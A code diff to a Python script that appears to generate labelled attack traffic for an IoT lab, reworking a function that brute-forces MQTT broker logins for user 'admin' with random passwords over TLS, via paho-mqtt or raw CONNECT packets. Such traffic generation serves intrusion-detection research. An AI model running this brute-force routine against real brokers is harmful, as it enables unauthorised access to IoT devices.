@@ -17,6 +17,11 @@ REPO_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
 sys.path.insert(0, REPO_DIR)
 from traffic.manifest import ManifestWriter
 
+try:
+    import paho.mqtt.client as mqtt
+except Exception:
+    mqtt = None
+
 
 def build_mqtt_connect_packet(client_id: str, username: str, password: str) -> bytes:
     """Construct a raw MQTT 3.1.1 CONNECT packet with credentials."""
@@ -58,19 +63,30 @@ def run_a5_bruteforce(target_ip="10.0.2.10", target_port=8883,
     while completed < attempts and (time.time() - start_ts < duration_s):
         completed += 1
         pw = random.choice(passwords)
-        pkt = build_mqtt_connect_packet(f"attacker_{completed}", "admin", pw)
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2.0)
-            tls = ctx.wrap_socket(s, server_hostname=target_ip)
-            tls.connect((target_ip, target_port))
-            tls.sendall(pkt)
-            try:
-                # Expect CONNACK with return code 0x04 or 0x05 (Bad User/Pass)
-                tls.recv(32)
-            except Exception:
-                pass
-            tls.close()
+            if mqtt is not None:
+                if hasattr(mqtt, "CallbackAPIVersion"):
+                    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"attacker_{completed}")
+                else:
+                    c = mqtt.Client(client_id=f"attacker_{completed}")
+                c.username_pw_set("admin", pw)
+                c.tls_set_context(ctx)
+                c.tls_insecure_set(True)
+                c.connect(target_ip, target_port, keepalive=10)
+                c.publish("iot/admin/probe", f"auth_try_{completed}".encode(), qos=0)
+                c.disconnect()
+            else:
+                pkt = build_mqtt_connect_packet(f"attacker_{completed}", "admin", pw)
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2.0)
+                tls = ctx.wrap_socket(s, server_hostname=target_ip)
+                tls.connect((target_ip, target_port))
+                tls.sendall(pkt)
+                try:
+                    tls.recv(32)
+                except Exception:
+                    pass
+                tls.close()
         except Exception:
             pass
         time.sleep(random.uniform(0.1, 0.4))
